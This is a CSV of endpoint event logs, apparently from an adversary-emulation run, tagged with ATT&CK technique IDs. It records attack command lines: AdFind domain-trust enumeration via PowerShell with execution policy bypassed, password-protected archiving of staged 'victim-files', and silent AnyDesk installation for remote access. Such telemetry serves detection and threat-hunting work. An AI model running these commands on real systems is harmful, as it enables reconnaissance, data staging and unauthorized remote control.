"TPP","EventTime","Level","ParentCommandLine","CommandLine","EventID"
"T1087.002","2025-04-06T02:26:21.033853800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T02:26:20.695823800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T02:24:49.288111200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T02:20:57.869721300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:57.520043300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:56.635164100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:56.264564500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:55.612156100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:55.229178100Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:54.819172800Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
